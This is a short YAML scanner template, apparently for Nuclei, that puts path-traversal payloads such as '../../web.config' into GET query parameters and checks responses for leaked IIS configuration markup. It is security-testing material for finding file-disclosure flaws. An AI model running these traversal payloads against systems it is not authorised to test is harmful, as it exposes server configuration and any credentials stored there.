http:
- fuzzing:
  - fuzz:
    - '{{fuzz}}'
    mode: single
    part: query
    type: replace
  matchers:
  - condition: and
    type: word
    words:
    - <configuration>
    - <system.webServer>
  method: GET
  path:
  - '{{BaseURL}}'
  payloads:
    fuzz:
    - web.config
    - ../web.config
    - ../../web.config
    - ../../../web.config
    - ../../../../web.config
    - ../../../../../web.config
  stop-at-first-match: true
id: web-config-fuzzing
info:
  author: reewardius
  name: Web Config Fuzzing GET Parameters
  reference: https://p4n7h3rx.medium.com/how-i-got-a-2000-bounty-with-rxss-e6f45f987793
  severity: high
  tags: fuzzing-lfi,fuzzing-req,dast
